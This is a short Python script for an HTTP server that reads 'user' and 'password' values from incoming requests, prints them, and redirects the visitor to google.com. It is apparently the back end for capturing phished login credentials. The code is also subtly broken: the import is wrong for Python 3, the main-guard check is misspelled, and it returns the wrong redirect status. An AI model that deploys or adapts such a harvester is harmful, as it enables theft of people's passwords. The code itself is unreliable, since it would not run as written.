from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import urlparse,parse_qs
hostName= "localhost"
ServerPort=8443

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        queries = parse_qs(urlparse(self.path).query)
        print("Username: %s, Password: %s"%(queries["user"][0],queries["password"][0]))
        self.send_response(300)
        self.send_header("Location","http://www.google.com")
        self.end_headers()
if __name__ == "_main_":
    webServer = HTTPServer((hostName, ServerPort),MyServer)
    print("Server started http://%s:%s"%(hostName, ServerPort))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server Stopped")